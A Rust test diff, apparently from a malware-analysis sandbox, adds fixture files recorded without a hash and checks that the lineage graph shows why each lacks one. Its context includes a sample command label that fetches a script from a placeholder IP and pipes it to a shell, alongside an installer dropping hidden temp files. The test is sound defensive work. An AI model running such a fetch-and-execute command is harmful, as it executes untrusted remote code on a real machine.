@@ -171,6 +171,21 @@ pub(super) fn save_digest(run: &RunSummary, tier: &str, hit: bool) {
                     writer: "/tmp/.x".into(),
                     ..LineageFile::default()
                 },
+                // Two files the run left without a hash, each with its reason.
+                LineageFile {
+                    path: "/tmp/.empty".into(),
+                    roles: vec!["created".into()],
+                    writer: "/tmp/install.sh".into(),
+                    hash_note: "empty file".into(),
+                    ..LineageFile::default()
+                },
+                LineageFile {
+                    path: "/var/tmp/.blob".into(),
+                    roles: vec!["created".into()],
+                    writer: "/tmp/install.sh".into(),
+                    hash_note: "file is 48234496 bytes, over the 16 MiB limit".into(),
+                    ..LineageFile::default()
+                },
                 LineageFile {
                     path: "/usr/bin/curl".into(),
                     sha256: sha(9),
@@ -345,6 +360,20 @@ fn the_summary_adds_up_the_runs_triage_digests() {
     let graph = app.samples_page.detail_lineage().unwrap();
     let labels: Vec<&str> = graph.nodes.iter().map(|node| node.label.as_str()).collect();
     assert!(labels.contains(&".x") && labels.contains(&"$ curl -s http://198.51.100.7/p | sh"));
+    // A file with no hash says why on its node.
+    let reason = |label: &str| {
+        graph
+            .nodes
+            .iter()
+            .find(|node| node.label == label)
+            .map(|node| node.no_hash_text())
+    };
+    assert_eq!(
+        reason(".empty").as_deref(),
+        Some("empty file"),
+        "{labels:?}"
+    );
+    assert!(reason(".blob").is_some_and(|text| text.contains("16 MiB")));
     // No base image is installed here, so no program has a hash the base
     // image's manifest vouches for: nothing is hidden as a system binary.
     assert_eq!(graph.hidden_system, 0, "{labels:?}");
